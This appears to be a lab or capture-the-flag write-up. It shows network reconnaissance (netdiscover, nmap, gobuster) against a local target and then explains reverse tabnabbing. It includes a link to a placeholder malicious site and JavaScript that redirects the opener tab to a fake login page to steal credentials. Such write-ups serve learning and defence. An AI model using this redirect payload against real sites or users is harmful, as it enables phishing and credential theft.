1. `sudo netdiscover -i eth0`
![image](https://hackmd.io/_uploads/r14CwEiLex.png)
    - Detect which devices are online on the same network segment.

2. `nmap -sV 192.168.101.131`
![image](https://hackmd.io/_uploads/B1ZMONjUex.png)

3. `gobuster dir -u http://192.168.101.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php , html , txt`
![image](https://hackmd.io/_uploads/ByUwGPo8gx.png)

4. Open the website
![image](https://hackmd.io/_uploads/ByNrYEoUle.png)

5. Register an account
![image](https://hackmd.io/_uploads/rkHBfwo8gx.png)

6. Determine the vulnerability type
    - "Tabnapping" (also known as Reverse Tabnabbing), which is a phishing attack related to `target="_blank"`.
    - What is Tabnapping?
      When a web page A contains a link pointing to web page B, and that link uses the `target="_blank"` attribute, the new tab B (the newly opened tab) can access and manipulate the original page A through the `window.opener` JavaScript object.

```html
<!-- On trusted-site.com -->
<a href="http://malicious-site.com" target="_blank">Click here to see something interesting</a>

An attacker can place malicious JavaScript code on `malicious-site.com`.

Attack flow:

The user clicks the link: The user is on the trusted website A and clicks a link you submitted, pointing to your malicious website B.
A new tab opens: The malicious website B opens in a new browser tab.
Malicious code executes: JavaScript on website B runs. This code uses `window.opener.location` to redirect the original tab (website A) to a fake login page.


```// Code on malicious-site.com
if (window.opener) {
  window.opener.location.replace('http://fake-login-page.com');
}

* The user returns to the original tab: When the user finishes viewing the new tab and closes it, they return to the original tab and see what appears to be the same page, but it is actually a fake login page (for example, disguised as a "Your account login" or "Bank login" page).
* Credential theft: The user, without suspicion, enters their username and password on the fake login page. These credentials are then sent to the attacker’s server.
